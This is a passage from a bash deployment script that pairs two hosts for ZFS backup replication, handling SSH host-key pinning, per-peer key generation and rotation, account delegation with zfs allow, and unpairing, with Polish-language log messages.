# Two fingerprints of that failure, both refused:
#   - more than one distinct address for one peer -- a real peer has one, a
#     search-domain accident routinely has several
#   - a public address, which no LAN pairing should ever produce
# A literal IP is exempt: no resolution happened, so there is nothing to have
# gone wrong, and a WAN pairing (which PAIRING-DESIGN.md allows) can always be
# addressed that way -- or with --allow-public-peer, deliberately.
assert_peer_address_sane() {
    case "$PEER_HOST" in
        *[!0-9.]*) ;;                     # not a bare IPv4 literal, keep checking
        *) log "peer address $PEER_HOST is a literal IP -- no name resolution involved"; return 0 ;;
    esac
    case "$PEER_HOST" in
        *:*) log "peer address $PEER_HOST is a literal IPv6 -- no name resolution involved"; return 0 ;;
    esac

    local addrs
    addrs=$(getent ahosts "$PEER_HOST" 2>/dev/null | awk '{print $1}' | sort -u)
    [ -n "$addrs" ] || die "--peer='$PEER_HOST' does not resolve on this host -- add it to /etc/hosts or pass the IP address directly"

    local count; count=$(printf '%s\n' "$addrs" | wc -l)
    if [ "$count" -gt 1 ]; then
        die "--peer='$PEER_HOST' resolves to $count different addresses ($(printf '%s' "$addrs" | tr '\n' ' ')) -- a peer has one. This is the signature of a search domain answering for a name that has no local entry, and ssh-keyscan would happily pin whichever of them replies first. Add '$PEER_HOST' to /etc/hosts, or pass the IP address to --peer."
    fi

    log "peer $PEER_HOST resolves to $addrs"
    if ! is_private_addr "$addrs"; then
        [ "$PEER_ALLOW_PUBLIC" -eq 1 ] || die "--peer='$PEER_HOST' resolves to $addrs, which is a PUBLIC address. If that is genuinely your peer over a WAN, re-run with --allow-public-peer (or pass the IP directly); if it is not, you were one command away from pinning a stranger's host key."
        warn "pairing with a PUBLIC address $addrs because --allow-public-peer was given -- verify the fingerprint below with extra care"
    fi
}

# The scanned host key belongs to the RELATIONSHIP, not to whichever account
# happened to run --pair. It is therefore written to a per-peer file holding
# exactly one key -- what the generated job points -k at -- as well as to
# /root/.ssh/known_hosts, which deploy.sh's own ssh calls read (--revoke-old
# connects with StrictHostKeyChecking=yes).
pin_host_key() {
    local scan="$1" file="$2"
    if grep -qF "$scan" "$file" 2>/dev/null; then
        log "host key for $PEER_HOST already pinned in $file"
        return 0
    fi
    printf '%s\n' "$scan" >> "$file" || die "could not write $file"
    log "pinned $PEER_HOST's host key to $file"
}

# Hole the pairing feature had until 2026-07-29: the key lives in
# /root/.ssh/pairing (0700, root), but for --role=pull the job that uses it is a
# snapget.sh cron line, and the whole point of a delegated account is that this
# line does NOT run as root. -K pointed at a file the running account could not
# read, and nothing said so until the job failed.
#
# The pinned host key had the identical hole one layer down, and both are
# installed HERE, by one function, on purpose: they are the two halves of "this
# job authenticates the peer and the peer authenticates this job", they are
# wanted at exactly the same moments, and keeping them in separate functions is
# how one of them silently stops being refreshed on rotation.
#
# The copy is deliberate rather than a chmod: /root/.ssh/pairing stays 0700 and
# root-owned, and only the ONE key for this relationship crosses over.
install_local_pairing_files() {
    local src_key="$1" src_kh="$2" label="$3" user="$4"
    local home_dir; home_dir=$(getent passwd "$user" | cut -d: -f6)
    [ -n "$home_dir" ] || die "cannot determine home directory for --local-user='$user'"
    local group; group=$(id -gn "$user")
    mkdir -p "$home_dir/.ssh"
    chown "$user:$group" "$home_dir/.ssh"
    chmod 700 "$home_dir/.ssh"

    local dest="$home_dir/.ssh/pairing-${label}_ed25519"
    install -o "$user" -g "$group" -m 600 "$src_key" "$dest" \
        || die "could not install a readable copy of the pairing key at $dest"
    log "installed a copy of the pairing key for $user: $dest"

    # Missing only for a pairing made before host-key pinning existed. Not
    # fatal: the key half is what makes the job work at all, and --draft-config
    # notices the absent file and declines to emit a -k pointing at nothing.
    if [ -f "$src_kh" ]; then
        local dest_kh="$home_dir/.ssh/pairing-${label}_known_hosts"
        install -o "$user" -g "$group" -m 600 "$src_kh" "$dest_kh" \
            || die "could not install a readable copy of the pinned host key at $dest_kh"
        log "installed the pinned host key for $user: $dest_kh"
    else
        warn "no pinned host-key file at $src_kh -- $user gets no -k, jobs will fall back to accept-new. Re-run --pair to create it."
    fi
    # Deliberately prints nothing but the log lines: an earlier version also
    # echoed $dest as a return value, which forced callers to redirect stdout
    # and silently swallowed the log with it. Callers that need a path ask
    # local_keyfile_path / local_knownhosts_path instead.
}

# Where the GENERATED job should look for the key: the local-user copy when
# there is one, otherwise root's original.
local_keyfile_path() {
    local label="$1" user="$2"
    if [ -n "$user" ]; then
        local home_dir; home_dir=$(getent passwd "$user" | cut -d: -f6)
        [ -n "$home_dir" ] && { printf '%s' "$home_dir/.ssh/pairing-${label}_ed25519"; return 0; }
    fi
    printf '%s' "$PEER_KEY_DIR/${label}_ed25519"
}

# Same question for the pinned host key. Root's job gets the per-peer file too,
# not /root/.ssh/known_hosts: that file accumulates whatever accept-new has
# recorded over the years, and pinning "one key, verified once at pair time" is
# the whole point of the -k the draft emits.
local_knownhosts_path() {
    local label="$1" user="$2"
    if [ -n "$user" ]; then
        local home_dir; home_dir=$(getent passwd "$user" | cut -d: -f6)
        [ -n "$home_dir" ] && { printf '%s' "$home_dir/.ssh/pairing-${label}_known_hosts"; return 0; }
    fi
    printf '%s' "$PEER_KEY_DIR/${label}_known_hosts"
}

# do_pair -- runs on the host that will connect (collector for pull, source
# for push). Generates/reuses a key dedicated to THIS relationship, pins the
# peer's host key, and produces the wsad for manual transfer.
do_pair() {
    local label; label=$(peer_label)
    local mpath; mpath=$(peer_manifest_path "$label")
    mkdir -p "$PEER_STATE_DIR" "$PEER_KEY_DIR"
    chmod 700 "$PEER_KEY_DIR"

    if [ "$PEER_UNPAIR" -eq 1 ]; then
        do_unpair "$label" "$mpath"
        return
    fi
    if [ "$PEER_REVOKE_OLD" -eq 1 ]; then
        do_revoke_old "$label" "$mpath"
        return
    fi
    if [ "$PEER_DRAFT_CONFIG" -eq 1 ]; then
        do_draft_config "$label" "$mpath"
        return
    fi

    if [ "$PEER_ROTATE" -eq 1 ]; then
        [ -r "$mpath" ] || die "--rotate needs an existing pairing for '$PEER_HOST' -- run --pair once first (without --rotate)"
        # shellcheck disable=SC1090
        . "$mpath"
        [ "${PEER_ROTATING:-no}" = "yes" ] && die "peer '$PEER_HOST' already has a rotation in progress -- finish it with --revoke-old first, or remove ${PEER_KEY_DIR}/${label}_ed25519.new by hand to restart"
        PEER_ROLE="${PEER_SAVED_ROLE:-$PEER_ROLE}"
        PEER_TARGET="${PEER_SAVED_TARGET:-$PEER_TARGET}"
        PEER_AS="${PEER_SAVED_AS:-$PEER_AS}"
        [ -n "$PEER_DATASETS" ] || PEER_DATASETS="${PEER_SAVED_DATASETS:-}"
        [ -n "$PEER_LOCAL_USER" ] || PEER_LOCAL_USER="${PEER_SAVED_LOCAL_USER:-}"
        [ "$PEER_PORT_GIVEN" -eq 1 ] || PEER_PORT="${PEER_SAVED_PORT:-$PEER_PORT}"
    else
        if [ -r "$mpath" ]; then
            # Re-pairing an existing relationship. Role/target/account-mode are
            # identity-defining for this relationship and must NOT silently
            # drift back to CLI defaults just because this invocation didn't
            # repeat them -- --role/--as default to "pull"/"delegated" whether
            # or not the admin typed them, so there is no way to tell "typed
            # the default" from "didn't type it at all". The saved manifest
            # always wins for these three; only the dataset list is allowed to
            # change here (additively, see below).
            local requested_datasets="$PEER_DATASETS"
            # shellcheck disable=SC1090
            . "$mpath"
            PEER_ROLE="${PEER_SAVED_ROLE:-$PEER_ROLE}"
            PEER_TARGET="${PEER_SAVED_TARGET:-$PEER_TARGET}"
            PEER_AS="${PEER_SAVED_AS:-$PEER_AS}"
            [ -n "$requested_datasets" ] && PEER_DATASETS="$requested_datasets" || PEER_DATASETS="${PEER_SAVED_DATASETS:-}"
            # --local-user and --port are operational, not identity-defining
            # (which account runs cron here, and which port sshd listens on,
            # can legitimately change), so a given value wins.
            [ -n "$PEER_LOCAL_USER" ] || PEER_LOCAL_USER="${PEER_SAVED_LOCAL_USER:-}"
            [ "$PEER_PORT_GIVEN" -eq 1 ] || PEER_PORT="${PEER_SAVED_PORT:-$PEER_PORT}"
            log "peer '$PEER_HOST' already paired -- reusing the existing key/role/target/account-mode, refreshing the wsad"
            if [ -n "$requested_datasets" ] && [ "${PEER_SAVED_DATASETS:-}" != "$requested_datasets" ]; then
                log "dataset list changed: '${PEER_SAVED_DATASETS:-}' -> '$requested_datasets'"
                log "(additive only on the --join side -- nothing already granted is ever revoked automatically)"
            fi
        else
            [ -n "$PEER_DATASETS" ] || die "--pair requires --peer-datasets=\"...\""
            [ -n "$PEER_TARGET" ] || die "--pair requires --target=DATASET"
        fi
    fi

    local keyfile="$PEER_KEY_DIR/${label}_ed25519"
    local active_keyfile="$keyfile"

    # ---- host key pinning: ssh-keyscan needs no prior trust, so this adds
    # zero manual steps compared to today's accept-new (see PAIRING-DESIGN.md,
    # decision B). It trusts whatever answers, so WHO answers is settled first. --
    assert_peer_address_sane
    log "fetching host key for $PEER_HOST:$PEER_PORT via ssh-keyscan..."
    local scan; scan=$(ssh-keyscan -p "$PEER_PORT" -t ed25519 "$PEER_HOST" 2>/dev/null)
    [ -n "$scan" ] || die "ssh-keyscan got nothing back from $PEER_HOST:$PEER_PORT -- host unreachable, wrong port, or sshd not up yet"
    local fp; fp=$(printf '%s\n' "$scan" | ssh-keygen -lf - 2>/dev/null | head -1)
    log "host key fingerprint for $PEER_HOST: $fp"
    log "CONFIRM this matches what you see connecting to $PEER_HOST directly before relying on it."
    mkdir -p /root/.ssh; chmod 700 /root/.ssh
    pin_host_key "$scan" /root/.ssh/known_hosts
    local peer_kh="$PEER_KEY_DIR/${label}_known_hosts"
    pin_host_key "$scan" "$peer_kh"

    # ---- dedicated per-peer keypair ----
    if [ "$PEER_ROTATE" -eq 1 ]; then
        active_keyfile="${keyfile}.new"
        [ -f "$active_keyfile" ] && die "a rotation is already in progress ($active_keyfile exists)"
        ssh-keygen -t ed25519 -N '' -f "$active_keyfile" -C "pairing-${label}-rotated-$(date +%Y%m%d)" \
            || die "ssh-keygen failed"
        log "generated a NEW key for rotation: $active_keyfile (old key untouched, both work until --revoke-old)"
    elif [ -f "$keyfile" ]; then
        log "keypair for '$PEER_HOST' already exists ($keyfile), reusing it -- pass --rotate to replace it instead"
    else
        ssh-keygen -t ed25519 -N '' -f "$keyfile" -C "pairing-${label}-$(date +%Y%m%d)" \
            || die "ssh-keygen failed"
        log "generated keypair for '$PEER_HOST': $keyfile"
    fi

    # ---- make the key usable by the account that will actually run the jobs.
    # NOT during --rotate: mid-rotation the new key is unproven, and the running
    # cron must keep using the old one until --revoke-old promotes it (which
    # refreshes this copy). That is what makes rotation zero-downtime for a
    # delegated account too, not just for root. ----
    if [ -n "$PEER_LOCAL_USER" ] && [ "$PEER_ROTATE" -eq 0 ]; then
        install_local_pairing_files "$keyfile" "$peer_kh" "$label" "$PEER_LOCAL_USER"
    fi

    # ---- target dataset: created HERE only for pull (local to this host).
    # For push the target is remote -- there is no trust to the peer yet at
    # --pair time, so that creation happens during --join instead.
    # Per the naming convention (<target>/<host-zrodla>/<dataset>), the actual
    # per-relationship root is target/label, not the bare target -- otherwise
    # a second peer pairing to the same --target parent would land in the same
    # spot. ----
    if [ "$PEER_ROLE" = "pull" ] && [ "$PEER_ROTATE" -eq 0 ]; then
        local dest_root="$PEER_TARGET/$label"
        if zfs list -H -o name "$dest_root" >/dev/null 2>&1; then
            log "target dataset $dest_root already exists"
        else
            zfs create -p "$dest_root" && log "created target dataset $dest_root" \
                || die "zfs create -p $dest_root failed"
        fi
        # The mirror image of what --join does on the peer, and it was simply
        # missing: --join delegates the SOURCE side over there, but nothing
        # delegated the RECEIVE side over here. As root that is invisible -- the
        # pairing looks finished and the first delegated snapget.sh run dies on
        # 'cannot receive: permission denied'. zfs allow is inherited by
        # descendants, so one grant on the per-peer root covers every dataset
        # received under it, whatever the peer decides to send.
        if [ -n "$PEER_LOCAL_USER" ]; then
            zfs allow -u "$PEER_LOCAL_USER" "$ZFS_PERMS" "$dest_root" \
                || die "zfs allow failed for $dest_root"
            log "delegated ($ZFS_PERMS) on $dest_root to $PEER_LOCAL_USER"
        else
            log "no --local-user given -- $dest_root is delegated to nobody, the generated jobs will have to run as root"
        fi
    fi

    local my_label; my_label=$(hostname -s 2>/dev/null || hostname)
    local proposed_account="zfsbackup-${my_label}"
    [ "$PEER_AS" = "root" ] && proposed_account="root"

    local pub; pub=$(cat "${active_keyfile}.pub")
    local rotating="no" prev_pub=""
    if [ "$PEER_ROTATE" -eq 1 ]; then
        rotating="yes"
        prev_pub=$(cat "${keyfile}.pub" 2>/dev/null || echo "")
    fi
    cat > "$mpath" <<EOF
# peer pairing manifest (initiator side) -- managed by deploy.sh --pair, do not edit by hand
PEER_SAVED_ROLE=$PEER_ROLE
PEER_SAVED_DATASETS="$PEER_DATASETS"
PEER_SAVED_TARGET=$PEER_TARGET
PEER_SAVED_AS=$PEER_AS
PEER_SAVED_ACCOUNT=$proposed_account
PEER_SAVED_PORT=$PEER_PORT
PEER_SAVED_LOCAL_USER=$PEER_LOCAL_USER
PEER_ROTATING=$rotating
PEER_CURRENT_PUBKEY='$pub'
PEER_PREVIOUS_PUBKEY='$prev_pub'
EOF
    chmod 0600 "$mpath"

    local workdir; workdir=$(mktemp -d)
    cp "${active_keyfile}.pub" "$workdir/pubkey.pub"
    cat > "$workdir/peer.conf" <<EOF
# wsad parowania -- wygenerowane przez deploy.sh --pair, konsumowane przez --join
PEER_CONF_ROLE=$PEER_ROLE
PEER_CONF_DATASETS="$PEER_DATASETS"
PEER_CONF_TARGET=$PEER_TARGET
PEER_CONF_AS=$PEER_AS
PEER_CONF_ACCOUNT=$proposed_account
PEER_CONF_PORT=$PEER_PORT
PEER_CONF_INITIATOR_LABEL=$my_label
EOF
    local outdir="/root/scripts/pairing"
    mkdir -p "$outdir"
    local suffix=""; [ "$PEER_ROTATE" -eq 1 ] && suffix="-rotate"
    local pkg="$outdir/${my_label}-to-${label}${suffix}.tgz"
    tar -C "$workdir" -czf "$pkg" peer.conf pubkey.pub
    rm -rf "$workdir"

    echo
    log "===================================================================="
    log "Wsad gotowy: $pkg"
    log "Przenies go recznie na $PEER_HOST i uruchom tam z konsoli:"
    log "  scp $pkg root@$PEER_HOST:/root/"
    log "  ssh root@$PEER_HOST"
    log "  ./deploy.sh --join=/root/$(basename "$pkg")"
    if [ "$PEER_ROTATE" -eq 1 ]; then
        log "Po --join tam: zweryfikuj dry-runem z NOWYM kluczem ($active_keyfile -n),"
        log "dopiero potem tutaj: --pair --peer=$PEER_HOST --revoke-old"
    fi
    log "===================================================================="
}

# do_join -- runs on the second host, once, from its own console. Consumes the
# wsad produced by --pair: never touches any account/relationship other than
# the one this specific package describes.
do_join() {
    # The package was validated and unpacked by prepare_package BEFORE the
    # deployment phases ran -- see the preflight next to --join-check. Nothing
    # is re-read or re-parsed here: a second independent parse of the same path
    # is exactly the window prepare_package's private copy exists to close.
    [ -n "${JOIN_WORKDIR:-}" ] && [ -f "$JOIN_WORKDIR/pubkey.pub" ]         || die "internal: do_join reached without a validated package"
    local workdir="$JOIN_WORKDIR"

    # Local aliases, now that every value has been checked. Named as before so
    # the rest of this function reads unchanged.
    local PEER_CONF_ROLE="${PC[PEER_CONF_ROLE]}"
    local PEER_CONF_TARGET="${PC[PEER_CONF_TARGET]}"
    local PEER_CONF_ACCOUNT="${PC[PEER_CONF_ACCOUNT]}"
    local PEER_CONF_AS="${PC[PEER_CONF_AS]}"
    local PEER_CONF_DATASETS="${PC[PEER_CONF_DATASETS]:-}"
    local PEER_CONF_INITIATOR_LABEL="${PC[PEER_CONF_INITIATOR_LABEL]}"

    # pc_is_label already refused anything this would have had to rewrite, so
    # the old sanitising tr is gone: a label that needed sanitising is now a
    # package to reject, not one to quietly repair.
    local label="$PEER_CONF_INITIATOR_LABEL"
    local mpath; mpath=$(peer_manifest_path "$label")
    local new_fp; new_fp=$(pubkey_fingerprint "$workdir/pubkey.pub")
    local new_pub; new_pub=$(cat "$workdir/pubkey.pub")
    log "package accepted: role=$PEER_CONF_ROLE as=$PEER_CONF_AS account=$PEER_CONF_ACCOUNT from '$label'"
    # ---- validation complete; persistent changes start here ----
    mkdir -p "$PEER_STATE_DIR"

    # ---- collision detection: manifest already exists under this label with
    # a DIFFERENT account/target -- that is two unrelated peers colliding on
    # the same label, not a rotation. Refuse rather than guess. A matching
    # account/target with a different key is treated as a legitimate rotation
    # driven by --rotate on the other side. ----
    if [ -r "$mpath" ]; then
        # shellcheck disable=SC1090
        . "$mpath"
        if [ -n "${PEER_JOIN_FINGERPRINT:-}" ] && [ "$PEER_JOIN_FINGERPRINT" != "$new_fp" ]; then
            if [ "${PEER_JOIN_ACCOUNT:-}" != "$PEER_CONF_ACCOUNT" ] || [ "${PEER_JOIN_TARGET:-}" != "$PEER_CONF_TARGET" ]; then
                die "manifest for label '$label' already exists with a DIFFERENT account/target ($PEER_JOIN_ACCOUNT/$PEER_JOIN_TARGET vs $PEER_CONF_ACCOUNT/$PEER_CONF_TARGET) -- this looks like a label collision between two unrelated peers, not a rotation. Resolve by hand, do not re-run blindly."
            fi
            log "new key for an already-known peer '$label' (rotation) -- adding alongside the existing one"
        fi
    fi

    local account="$PEER_CONF_ACCOUNT"
    local home_dir="/root"
    if [ "$PEER_CONF_AS" != "root" ]; then
        if id "$account" >/dev/null 2>&1; then
            log "account $account already exists, leaving it alone"
        else
            useradd -m -s /bin/bash -c "zfs-snapshot-all peer account for $label" "$account" || die "useradd failed"
            passwd -l "$account" >/dev/null || warn "could not lock password for $account"
            log "created isolated peer account $account"
        fi
        home_dir="/home/$account"
    fi

    local ssh_dir="$home_dir/.ssh"
    local ak="$ssh_dir/authorized_keys"
    mkdir -p "$ssh_dir"
    chmod 700 "$ssh_dir"
    touch "$ak"
    if grep -qF "$new_pub" "$ak" 2>/dev/null; then
        log "this exact key is already in $ak, leaving it alone"
    else
        echo "$new_pub" >> "$ak"
        log "appended new key to $ak (append-only, existing keys untouched)"
    fi
    chmod 600 "$ak"
    if [ "$PEER_CONF_AS" != "root" ]; then
        chown -R "$account:$account" "$ssh_dir"
    fi

    # ---- target dataset: created HERE only for push (this host is the
    # receiver in that role). For pull it was already created by --pair.
    # Per the naming convention (<target>/<host-zrodla>/<dataset>), the root
    # to create/allow is target/initiator-label -- the initiator IS the
    # "source host" from this side's point of view in push mode. ----
    local push_dest_root=""
    if [ "$PEER_CONF_ROLE" = "push" ]; then
        push_dest_root="$PEER_CONF_TARGET/${PEER_CONF_INITIATOR_LABEL:-$label}"
        if zfs list -H -o name -- "$push_dest_root" >/dev/null 2>&1; then
            log "target dataset $push_dest_root already exists"
        else
            zfs create -p -- "$push_dest_root" && log "created target dataset $push_dest_root" \
                || die "zfs create -p $push_dest_root failed"
        fi
    fi

    # ---- zfs allow: the permission set AND the scope depend on the ROLE, not
    # one blanket list. pull: this host is the SOURCE, delegate exactly the
    # listed datasets (they exist here) with sending permissions. push: this
    # host is the TARGET, delegate the per-relationship destination ROOT
    # (push_dest_root) with receiving permissions -- zfs allow is inherited to
    # descendants, so this covers every dataset 'zfs receive' creates under it
    # without needing (or being able) to know the source's dataset names in
    # advance. Bookmarks only make sense on the send side. Skipped entirely
    # for --as=root, which already has full authority. ----
    if [ "$PEER_CONF_AS" != "root" ]; then
        if [ "$PEER_CONF_ROLE" = "pull" ]; then
            local perms="snapshot,destroy,send,hold,release,bookmark"
            for ds in $PEER_CONF_DATASETS; do
                if ! zfs list -H -o name -- "$ds" >/dev/null 2>&1; then
                    warn "dataset $ds does not exist on this host -- skipping (create it first, then: zfs allow -u $account $perms $ds)"
                    continue
                fi
                zfs allow -u "$account" "$perms" -- "$ds" || die "zfs allow failed for $ds"
                log "delegated ($perms) on $ds to $account"
            done
        else
            local perms="receive,create,mount,rollback,canmount"
            zfs allow -u "$account" "$perms" -- "$push_dest_root" || die "zfs allow failed for $push_dest_root"
            log "delegated ($perms) on $push_dest_root to $account (inherited by every dataset received under it)"
        fi
    fi

    # Quoted, and written from values the grammar checks already accepted. This
    # file is read back with `.` by later runs, so it is the second sink for
    # anything the package could smuggle -- belt and braces on purpose.
    cat > "$mpath" <<EOF
# peer pairing manifest (join side) -- managed by deploy.sh --join, do not edit by hand
PEER_JOIN_ROLE="$PEER_CONF_ROLE"
PEER_JOIN_DATASETS="$PEER_CONF_DATASETS"
PEER_JOIN_TARGET="$PEER_CONF_TARGET"
PEER_JOIN_ACCOUNT="$account"
PEER_JOIN_FINGERPRINT="$new_fp"
EOF
    chmod 0600 "$mpath"

    echo
    log "===================================================================="
    log "Join zakonczony dla peera '$label' (konto: $account, rola: $PEER_CONF_ROLE)."
    log "Zadne linie crona NIE zostaly dodane -- to pozostaje reczne, jak w Czesci 5."
    log "===================================================================="
}

# do_revoke_old -- the ONLY step in this whole feature that removes something.
# Deliberately its own explicit command, only runs mid-rotation, and only ever
# touches the one exact key line recorded at --rotate time.
do_revoke_old() {
    local label="$1" mpath="$2"
    [ -r "$mpath" ] || die "no pairing manifest for '$PEER_HOST' -- nothing to revoke"
    # shellcheck disable=SC1090
    . "$mpath"
    [ "${PEER_ROTATING:-no}" = "yes" ] || die "peer '$PEER_HOST' is not mid-rotation (manifest says rotating=no) -- nothing to revoke"

    local keyfile="$PEER_KEY_DIR/${label}_ed25519"
    local newkey="${keyfile}.new"
    [ -f "$newkey" ] || die "expected $newkey from --rotate, not found -- rotation state is inconsistent, resolve by hand"
    [ -n "${PEER_PREVIOUS_PUBKEY:-}" ] || die "manifest has no PEER_PREVIOUS_PUBKEY -- cannot safely identify which line to remove, resolve by hand"

    local remote_user="${PEER_SAVED_ACCOUNT:-root}"
    log "removing the OLD key from ${remote_user}@${PEER_HOST} using the already-verified NEW key..."
    # The old key's exact content travels over stdin, never embedded in the
    # remote command line -- avoids any shell-quoting risk on either end.
    printf '%s\n' "$PEER_PREVIOUS_PUBKEY" | ssh -i "$newkey" -p "${PEER_SAVED_PORT:-22}" \
        -o BatchMode=yes -o StrictHostKeyChecking=yes "${remote_user}@${PEER_HOST}" \
        'read -r oldline; f=~/.ssh/authorized_keys; grep -vF "$oldline" "$f" > "$f.tmp.$$" && mv "$f.tmp.$$" "$f"' \
        || die "could not remove the old key on the peer over SSH -- did you verify the new key with a dry-run first? Old key left in place, nothing changed."

    rm -f "$keyfile" "${keyfile}.pub"
    mv "$newkey" "$keyfile"
    mv "${newkey}.pub" "${keyfile}.pub"
    # The delegated account's copy still holds the key we just revoked. Refresh
    # it HERE, at the one moment the new key is both proven and promoted --
    # miss this and rotation quietly breaks every job running as that account
    # while root's own path keeps working, which is the worst way to find out.
    if [ -n "${PEER_SAVED_LOCAL_USER:-}" ]; then
        install_local_pairing_files "$keyfile" "$PEER_KEY_DIR/${label}_known_hosts" \
            "$label" "$PEER_SAVED_LOCAL_USER"
    fi
    local new_current; new_current=$(cat "${keyfile}.pub")
    sed -i -e 's/^PEER_ROTATING=.*/PEER_ROTATING=no/' \
           -e "s|^PEER_PREVIOUS_PUBKEY=.*|PEER_PREVIOUS_PUBKEY=''|" \
        "$mpath"
    # PEER_CURRENT_PUBKEY may contain '/' or other sed-hostile characters (it
    # is base64), so it is rewritten with a fresh cat > rather than another
    # sed substitution.
    grep -v '^PEER_CURRENT_PUBKEY=' "$mpath" > "${mpath}.tmp"
    printf "PEER_CURRENT_PUBKEY='%s'\n" "$new_current" >> "${mpath}.tmp"
    mv "${mpath}.tmp" "$mpath"
    log "rotation complete for '$PEER_HOST' -- $keyfile is now the only active key, cron lines referencing it need no change"
}

# Anything still running the pairing key is the one thing --unpair must not
# walk past. Delete the key out from under a live cron line and the relationship
# does not end cleanly -- it turns into a job that fails every night and mails
# about it, which is strictly worse than the pairing it replaced. Checked before
# any state is touched, and refused rather than warned: there is no version of
# "continue anyway" here that leaves the host in a good state.
unpair_assert_no_cron_users() {
    local label="$1" local_user="$2"
    local -a users=(root)
    [ -n "$local_user" ] && users+=("$local_user")
    local u found=0 hits
    for u in "${users[@]}"; do
        hits=$(crontab -l -u "$u" 2>/dev/null \
            | grep -F -e "${label}_ed25519" -e "pairing-${label}_" -e "@${PEER_HOST}:") || true
        [ -n "$hits" ] || continue
        found=1
        warn "crontab of '$u' still uses this pairing:"
        printf '%s\n' "$hits" | while IFS= read -r line; do warn "    $line"; done
    done
    [ "$found" -eq 0 ] && return 0
    die "refusing to unpair '$PEER_HOST' while the lines above still run. Remove the [dataset:] section from the gen-cron config and re-run gen-cron.sh --install first, then --unpair. (Removing only the crontab line leaves the config to put it back on the next generate.)"
}

# Revoking the grant this pairing made does NOT mean the account lost access.
# `zfs allow` is inherited, so a broader grant on any ANCESTOR still covers the
# per-peer root -- and unallowing somebody else's ancestor grant would be well
# outside what --unpair was asked to do. So it is reported instead of touched.
#
# Found live, not by reading: on pve1 the target sat under hdd/backuptest_targets,
# which already had a Local+Descendent grant for the same account from unrelated
# work. --unpair logged "revoked", and the account could still snapshot the
# dataset a second later. "Revoked" was true and misleading at the same time,
# which is the worst kind of accurate log line.
unpair_report_residual_access() {
    local user="$1" dataset="$2"
    local residual
    residual=$(zfs allow "$dataset" 2>/dev/null | awk -v u="$user" '
        /^---- Permissions on /    { ds = $4 }
        $1 == "user" && $2 == u    { if (ds != "") print ds }' | sort -u) || return 0
    [ -n "$residual" ] || return 0
    warn "$user STILL has effective access to $dataset -- inherited from a grant on: $(printf '%s' "$residual" | tr '\n' ' ')"
    warn "that grant predates this pairing and is not ours to remove; if isolation is the point, revoke it by hand: zfs unallow -u $user <ten dataset>"
}

# do_unpair -- end the relationship on THIS side and print exactly what to run
# on the peer.
#
# Deliberately one-sided, unlike --revoke-old which does reach across. At
# decommission time there is no reason to assume the ssh path still works --
# that is often WHY someone is unpairing -- and creating/deleting an account on
# somebody else's machine over a link that is being torn down is the wrong
# default. The commands are printed with the exact key content so the admin can
# run them from that host's own console and watch them happen.
#
# Never touches received DATA. A backup that outlives the relationship is the
# normal case, not an accident; destroying it would make --unpair the most
# dangerous flag in this script. Same reason /root/.ssh/known_hosts is left
# alone: a pinned host key is our record of who they are, not a grant to them,
# and it may well be relied on by something else on this host by now.
do_unpair() {
    local label="$1" mpath="$2"
    [ -r "$mpath" ] || die "no pairing for '$PEER_HOST' on this host -- nothing to unpair (looked for $mpath)"
    # shellcheck disable=SC1090
    . "$mpath"

    local local_user="${PEER_SAVED_LOCAL_USER:-}"
    unpair_assert_no_cron_users "$label" "$local_user"

    local keyfile="$PEER_KEY_DIR/${label}_ed25519"
    local rotating="${PEER_ROTATING:-no}"

    # Mid-rotation the peer has TWO keys authorized, so the instructions below
    # must remove both. Handled rather than refused: being unable to tear down
    # until you first finish a rotation you no longer want is a silly place to
    # be stuck.
    [ "$rotating" = "yes" ] && warn "peer '$PEER_HOST' was mid-rotation -- the peer has TWO authorized keys and both are listed below"

    rm -f "$keyfile" "${keyfile}.pub" "${keyfile}.new" "${keyfile}.new.pub" \
          "$PEER_KEY_DIR/${label}_known_hosts"
    log "removed the pairing keys and pinned host key for '$PEER_HOST'"

    if [ -n "$local_user" ]; then
        local home_dir; home_dir=$(getent passwd "$local_user" | cut -d: -f6)
        if [ -n "$home_dir" ]; then
            rm -f "$home_dir/.ssh/pairing-${label}_ed25519" \
                  "$home_dir/.ssh/pairing-${label}_known_hosts"
            log "removed $local_user's copies"
        else
            warn "account '$local_user' from the manifest no longer exists -- its copies (if any) were left alone"
        fi
    fi

    # Only the delegation this pairing granted, only on the per-peer root, and
    # only for pull -- for push the receive side was never delegated here.
    if [ "${PEER_SAVED_ROLE:-pull}" = "pull" ] && [ -n "$local_user" ]; then
        local dest_root="${PEER_SAVED_TARGET:-}/$label"
        if [ -n "${PEER_SAVED_TARGET:-}" ] && zfs list -H -o name "$dest_root" >/dev/null 2>&1; then
            if zfs unallow -u "$local_user" "$ZFS_PERMS" "$dest_root" 2>/dev/null; then
                log "revoked $local_user's delegation on $dest_root"
                warn "any prune/monitor job for $dest_root running as $local_user will now fail -- re-grant with: zfs allow -u $local_user $ZFS_PERMS $dest_root"
                unpair_report_residual_access "$local_user" "$dest_root"
            else
                warn "could not revoke the delegation on $dest_root -- check it by hand: zfs allow $dest_root"
            fi
        fi
        [ -n "${PEER_SAVED_TARGET:-}" ] && log "DATA LEFT IN PLACE: $dest_root (unpairing ends the relationship, not the backup)"
    fi

    rm -f "$mpath"
    rm -f "/root/scripts/pairing/${label}.conf.suggested" \
          "/root/scripts/pairing/"*"-to-${PEER_HOST}.tgz" \
          "/root/scripts/pairing/"*"-to-${PEER_HOST}-rotate.tgz"
    log "removed the manifest and any leftover wsad/draft for '$PEER_HOST'"

    local remote_user="${PEER_SAVED_ACCOUNT:-root}"
    echo
    echo ">>> ===================================================================="
    echo ">>> Strona lokalna posprzatana. Reszta jest na $PEER_HOST -- uruchom tam"
    echo ">>> z konsoli (nie stad: to konto i te uprawnienia sa ich, nie nasze):"
    echo ">>> ===================================================================="
    if [ "${PEER_SAVED_AS:-delegated}" = "delegated" ]; then
        echo "  # 1. cofnij delegacje ZFS (dataset ZOSTAJE, znika tylko dostep konta)"
        local ds
        for ds in ${PEER_SAVED_DATASETS:-}; do
            echo "  zfs unallow -u $remote_user $ds"
        done
        echo "  # (sprawdz tez, czy konto nie ma dostepu z grantu na PRZODKU:"
        echo "  #  'zfs allow <dataset>' pokazuje rowniez odziedziczone -- unallow"
        echo "  #  na samym datasecie ich nie zdejmuje)"
        echo "  # 2. usun konto razem z jego authorized_keys"
        echo "  userdel -r $remote_user"
    else
        echo "  # konto to root (--as=root), wiec zostaje -- usun sam klucz:"
        printf '  grep -vF %s ~/.ssh/authorized_keys > /tmp/ak.$$ && mv /tmp/ak.$$ ~/.ssh/authorized_keys\n' \
            "'${PEER_CURRENT_PUBKEY:-<brak w manifescie>}'"
